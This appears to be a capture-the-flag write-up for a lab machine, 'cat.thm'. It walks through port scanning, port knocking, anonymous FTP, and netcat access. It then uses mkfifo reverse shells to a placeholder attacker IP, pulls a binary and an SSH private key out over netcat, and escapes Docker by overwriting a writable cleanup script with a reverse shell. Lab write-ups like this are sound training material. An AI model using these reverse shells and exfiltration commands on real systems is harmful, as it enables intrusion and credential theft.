# Enumeration

## \[+] 10.10.212.29 - cat.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.212.29 cat.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.212.29
```

First I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 8080 - HTTP

On this port we will find a phpBB forum with a single post:

In the post we will get a clue on how to access the system:

![64fa7f15679c8a2116561cb0bf51f9b0.png](/resources/3cdf85d6a758460c81f04b71975d7072.png)

## \[+] Ports 1111, 2222, 3333, 4444

To gain access to this service, we will need to utilize [Port Knocking](https://www.howtogeek.com/442733/how-to-use-port-knocking-on-linux-and-why-you-shouldnt/). As hinted in the forum post, we have to connect to the ports in the sequence, 1111, 2222, 3333, 4444.

First we will have to install the `knockd` package:

```sh
sudo apt install knockd
```

Then run the `knock` command with the port sequence and the `-d` flag to add a delay of 100 miliseconds (might need to adjust this amount if the FTP isn't working):

```sh
knock -d 100 $RHOSTS 1111 2222 3333 4444
```

After executing the port knock, we will run another Nmap scan to see a new service open on port 21:

```sh
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 21 - FTP

We are now able to connect to the FTP service anonymously using the following command:

```sh
ftp anonymous@$RHOSTS
```

Inside the FTP server we will find a text file which we can download using the `get` command:

```sh
ls -lah
get note.txt
exit
```

In the note we will find the password to access the service on port 4420:

```sh
cat note.txt
```

![8869ba2b15aa1f222450c138a7be53df.png](/resources/74733e10584049fc8eb65193bc3ec920.png)

# Initial Foothold

## \[+] Port 4420 - TCP

We can connect to this port using Netcat, then enter the password when prompted and we enter a pseudo terminal:

```sh
nc $RHOSTS 4420
ls
```

![ab25476c8df570a33d901c87b6b30d36.png](/resources/9350fe64306d4a4dbc900d6048cbac5a.png)

Since we can't use `cd` to change directories, let's use `ls` to see what binaries are available to us in the `/usr/bin/` directory:

```sh
ls /usr/bin/
```

![3f1a56c4ec4737267d5fdcca5b4a0516.png](/resources/edd3d29e8aa340d08acde3ff2a4e26ed.png)

There is `mkfifo` which means we can try to get a reverse shell from here to break out of this pseudo terminal.

In a new terminal on the attacking machine, start a Netcat listener:

```sh
nc -nvlp 4444
```

Then on the victim machine, we run the following command:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

When we check back to our listener, we should have a connection back from the victim machine and a full bash shell, but we are still restricted since not all standard binaries are installed on this machine:

![f4848b1964769105c0de2ad5491804ea.png](/resources/380fa437436746de9fb35a23f217efeb.png)

Inside the `/home/catlover/` directory we will find a binary named `runme`:

![e7fcc928a6961702bcb58210decd0e95.png](/resources/8432bebcf740493794fe4d4fd077d269.png)

When we run this binary, we are prompted for a password and the passwords we have found will work:

![6210d6e7250b9de39cf009b11be2b9f2.png](/resources/fa53811d6f9c48ebbc134c0acd493d03.png)

Let's transfer this file to our machine so we can analyze it. On our attacking machine we run the command:

```sh
nc -nvlp 4445 > runme
```

On the victim machine run the command:

```sh
nc <ATTACKER_IP> < /home/catlover/runme
```

After a minute, on the attacking machine, press `CTRL+C` to close the Netcat listener and run the `strings` command on the binary. Scrolling through the output, we will find the "Please enter yout password" string and the correct password needed:

```sh
strings runme
```

![7d3a1f5b443bc0c6dbf1ad98d6eff12a.png](/resources/ce6a486f10fd4ea685af9a23092aa13e.png)

Back on the victim machine, we run the binary again using `./runme` and enter the password when prompted. When we enter the correct password, there will be an SSH key in the same folder named `id_rsa`:

![83894ebfd0f46627a3be054bc3bca30a.png](/resources/2cc087a1f4a047a3909e5b0d96daeaa7.png)

We can transfer this SSH key the same way we did with the `runme` file.

On the attacking machine:

```sh
nc -nvlp 4445 > catlover.key
```

On the victim machine:

```sh
nc <ATTACKER_IP> 4445 < /home/catlover/id_rsa
```

After a minute, on the attacking machine, press `CTRL+C` to close the Netcat listener. Then use the `chmod` command to give the SSH key the proper permissions before connecting via SSH:

```sh
chmod 600 catlover.key
```

## \[+] Port 22 - SSH

Let's connect via SSH using the key we just got with the [ssh](https://linux.die.net/man/1/ssh) command:

```sh
ssh -i catlover.key catlover@$RHOSTS
```

![ef62052b121f5aa32c7af3b3f0e3e319.png](/resources/34fb8ec4597746d09937272a8098ac87.png)

We can find the first flag in `/root/flag.txt`:

```sh
cat /root/flag.txt
```

![532115e3f350d69139d03c84b42ee874.png](/resources/2dcfb363aa3f4c989df2ad3fc982cda5.png)

# Privilege Escalation

In the root directory we will find a `.dockerenv` file which means we are currently in a [Docker](https://www.docker.com/) container:

![8fe8e8de2d547163a2a1b05d7ef75dcb.png](/resources/96c0e0ddc8b34146a9b4ec10e60837af.png)

The `.bash_history` is a log file with all the previously ran bash commands. We will find our next hint on how to escape this Docker container:

```sh
cat .bash_history
```

![d6e56d3b2e33a83607d453ae46a1f947.png](/resources/30e9ffa8bb7444acba0fc9baef745fb0.png)

Checking the `/opt/clean/clean.sh` file we will find the script is being used to clear out the `/tmp` directory which is on the host machine outside of the Docker container. Since we can write to this script, we can use it to get a reverse shell.

```sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4446 >/tmp/f" > /opt/clean/clean.sh
```

Then start another Netcat listener on our attacking machine:

```sh
nc -nvlp 4446
```

After a moment we should have a connection from the victim host machine:

We can find the root flag in `/root/root.txt`:

![53ba7b59564e26a87161544ec4e6e5f4.png](/resources/088ff0bb47d94654b601d4551e23e9d3.png)
